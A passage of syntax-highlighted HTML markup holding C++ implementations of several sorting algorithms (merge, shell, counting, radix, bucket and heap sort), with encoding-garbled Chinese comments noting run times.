operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">qSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// å½’å¹¶æ’åºï¼ˆ192 msï¼‰</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">mSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">>=</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">{</span>nums<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> l<span class="token operator">+</span><span class="token punctuation">(</span>r<span class="token operator">-</span>l<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> lnums <span class="token operator">=</span> <span class="token function">mSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> rnums <span class="token operator">=</span> <span class="token function">mSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> res<span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m<span class="token operator">-</span>l <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> r<span class="token operator">-</span>m<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>lnums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> rnums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>lnums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>rnums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m<span class="token operator">-</span>l<span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>lnums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;=</span> r<span class="token operator">-</span>m<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>rnums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">mergeSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nums <span class="token operator">=</span> <span class="token function">mSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// å½’å¹¶æ’åº + éé€’å½’ï¼ˆ80 msï¼‰</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">mergeSortNR</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> len <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> len <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> n<span class="token operator">-</span>len<span class="token punctuation">;</span> l <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>len<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">int</span> m <span class="token operator">=</span> l<span class="token operator">+</span>len<span class="token number">-1</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">,</span> l<span class="token operator">+</span><span class="token number">2</span><span class="token operator">*</span>len<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> res<span class="token punctuation">;</span>                <span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">,</span> j <span class="token operator">=</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                        res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;=</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> r<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> res<span class="token punctuation">[</span>i<span class="token operator">-</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// å¸Œå°”æ’åºï¼ˆ40 msï¼‰</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">shellSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> gap <span class="token operator">=</span> n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span> gap <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> gap <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> gap<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j<span class="token operator">-</span>gap <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>j<span class="token operator">-</span>gap<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span> j <span class="token operator">-</span><span class="token operator">=</span> gap<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token operator">-</span>gap<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// è®¡æ•°æ’åºï¼ˆ32 msï¼‰</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">countSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>n<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> minv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">min_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> maxv<span class="token operator">-</span>minv<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">count</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            count<span class="token punctuation">[</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>minv<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> res<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> count<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">+</span>minv<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// åŸºæ•°æ’åºï¼ˆä¸é€‚ç”¨äºè´Ÿæ•°ï¼‰</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">radixSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxd <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>maxv <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            maxv <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>            maxd<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rank</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> base <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>maxd <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            count<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                count<span class="token punctuation">[</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/</span>base<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                count<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> count<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token number">-1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                rank<span class="token punctuation">[</span><span class="token operator">--</span>count<span class="token punctuation">[</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/</span>base<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> rank<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            maxd<span class="token operator">--</span><span class="token punctuation">;</span>            base <span class="token operator">*</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// æ¡¶æ’åº (20 ms)</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">bucketSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> minv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">min_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> bs <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token punctuation">(</span>maxv<span class="token operator">-</span>minv<span class="token punctuation">)</span><span class="token operator">/</span>bs<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">></span> <span class="token function">bucket</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            bucket<span class="token punctuation">[</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>minv<span class="token punctuation">)</span><span class="token operator">/</span>bs<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span> idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> sz <span class="token operator">=</span> bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">quickSort</span><span class="token punctuation">(</span>bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> sz<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                nums<span class="token punctuation">[</span>idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// å †æ’åºï¼ˆ32 msï¼‰</span>    <span class="token keyword">void</span> <span class="token function">adjust</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">&lt;</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> c1 <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> c2 <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token punctuation">(</span>c2<span class="token operator">&lt;</span>s <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>c2<span class="token punctuation">]</span><span class="token operator">></span>nums<span class="token punctuation">[</span>c1<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> c2 <span class="token operator">:</span> c1<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            p <span class="token operator">=</span> c<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">heapSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token operator">/</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">adjust</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> i<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token number">-1</span><span class="token punctuation">;</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">adjust</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" 